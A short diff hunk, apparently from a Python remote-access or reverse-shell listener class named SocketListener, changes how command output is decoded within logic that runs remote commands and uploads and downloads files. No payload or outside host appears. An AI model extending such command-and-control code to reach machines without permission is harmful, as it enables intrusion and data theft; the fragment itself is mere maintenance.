@@ -61,7 +61,7 @@ class SocketListener:
                     file_contents = self.get_file_contents(command_input[1])
                     command_input.append(file_contents)
 
-                command_output = self.command_execution(command_input).decode()
+                command_output = self.command_execution(command_input)
 
                 if command_input[0] == "download" and "Error!!" not in command_output:
                     command_output = self.save_file(command_input[1],command_output)
